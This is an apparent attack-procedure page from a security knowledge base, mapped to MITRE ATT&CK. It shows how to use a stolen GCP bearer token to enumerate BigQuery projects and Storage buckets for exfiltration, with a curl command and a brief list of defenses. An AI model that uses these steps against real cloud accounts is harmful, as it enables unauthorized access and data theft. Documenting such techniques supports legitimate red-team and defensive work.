---
id: uuid-6
tags:
  - gcp-api
  - bigquery
  - exfiltration
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-bigquery-list-projects]]'
verified: false
platforms:
  - GCP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exfiltration Over Alternative Protocol]]'
  - '[[Transfer Data to Cloud Account]]'
updated_at: '2025-12-14T04:08:55.617Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exfiltration Over Alternative Protocol]]'
  - '[[Transfer Data to Cloud Account]]'
---
# Query-GCP-APIs-with-Obtained-Token

## Summary

This procedure uses the stolen bearer token to authenticate API requests to GCP services, listing projects, datasets, and accessing storage, demonstrating full resource compromise.

## Description

With the token's scopes, make authorized calls to BigQuery v2, Storage, and BigTable APIs from the attacker's machine, bypassing direct instance access.

## Requirements

1. Valid bearer token from metadata
2. curl or similar HTTP client
3. Knowledge of target project 'en-development'

## Defense

Defensive measures and detection strategies:

- Enable GCP Logging and monitor API calls for unusual IPs
- Use service account keys with limited scopes
- Implement API rate limiting and anomaly detection

## Objectives

1. List and access BigQuery projects/datasets
2. Query BigTable instances
3. Browse Cloud Storage buckets for exfiltration

## Instructions

### Step 1: List BigQuery Projects

**Context**: Use token to query BigQuery API for project enumeration.

**Command** ([[commands/curl-bigquery-list-projects]]):
```bash
TOKEN="[redacted]" curl https://www.googleapis.com/bigquery/v2/projects -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json"
```

> Returns JSON with projects like 'en-development', 'en-testing'.

### Step 2: Extend to Other Services

**Context**: Adapt for Storage and BigTable.

**Instructions**: Replace endpoint, e.g., curl ... https://storage.googleapis.com/storage/v1/b for bucket listing.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Exfiltration Over Alternative Protocol]] Exfiltration Over Alternative Protocol
- [[Transfer Data to Cloud Account]] Transfer Data to Cloud Account

### Sub-Techniques


## Commands Used

- [[commands/curl-bigquery-list-projects]]

## Tools Used

- [[tools/curl]]

## Tags

- [[gcp-api]]
- [[bigquery]]
- [[Exfiltration]]
